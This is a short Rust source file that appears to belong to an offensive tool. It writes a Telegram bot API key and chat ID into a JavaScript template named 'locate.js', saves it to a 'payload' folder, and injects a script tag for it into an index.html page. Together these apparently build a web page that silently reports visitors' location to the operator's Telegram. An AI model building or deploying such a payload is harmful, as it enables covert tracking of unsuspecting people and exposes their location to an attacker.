#[warn(unused_imports)]
use std::fs;
use std::fs::OpenOptions;
use std::io::{Result, Write};

pub fn bind_js_to_file(api_key: &str, chat_id: &str) -> Result<()>{
    let file = fs::read_to_string("files/locate.js.md");
    let content = file?.replace("YOUR_TELEGRAM_BOT_API_KEY", api_key)
        .replace("YOUR_CHAT_ID", chat_id);

    fs::write("payload/new_locate.js", content)?;

    println!("Js Binded with your API Keys!");
    Ok(())
}

pub fn bind_js_to_html(){
    let file_path  = "payload/index.html";
    let append = "<script src=\"new_locate.js\"></script>";

    let mut file = OpenOptions::new()
        .append(true)
        .open(file_path)
        .expect("Failed to open file");

    file.write_all(append.as_bytes()).expect("Failed to write file ");
    println!("Successfully Binded <script> to the index.html file");
}